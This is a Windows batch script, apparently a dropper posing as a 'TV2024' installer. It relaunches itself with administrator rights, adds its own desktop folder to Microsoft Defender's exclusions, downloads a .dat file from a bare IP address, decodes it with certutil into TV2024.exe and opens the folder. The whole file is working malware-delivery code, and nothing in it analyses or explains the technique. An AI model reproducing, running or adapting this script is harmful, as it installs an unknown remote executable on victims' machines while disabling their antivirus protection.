@echo off
setlocal
if not "%1"=="am_admin" (powershell start -verb runas '%0' am_admin & exit /b)

set "desktopPath=%USERPROFILE%\Desktop"

set "tv2024Folder=%desktopPath%\TV2024"
mkdir "%tv2024Folder%" 2>nul

Powershell.exe -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%tv2024Folder%'"

set "sourceUrl=http://103.56.164.131:8090/download/TV2024.dat"
set "downloadedFilePath=%tv2024Folder%\TV2024.dat"
set "decodedFilePath=%tv2024Folder%\TV2024.exe"

if not exist "%downloadedFilePath%" (
    echo Downloading TV2024.dat
    powershell -ExecutionPolicy Bypass -Command "(New-Object Net.WebClient).DownloadFile('%sourceUrl%', '%downloadedFilePath%')"
) else (
    echo TV2024.dat already exists.
)

if not exist "%decodedFilePath%" (
    echo Decoding TV2024.dat to TV2024.exe
    certutil -decodehex "%downloadedFilePath%" "%decodedFilePath%"
) else (
    echo TV2024.exe already exists.
)

explorer "%TV2024Folder%"

endlocal
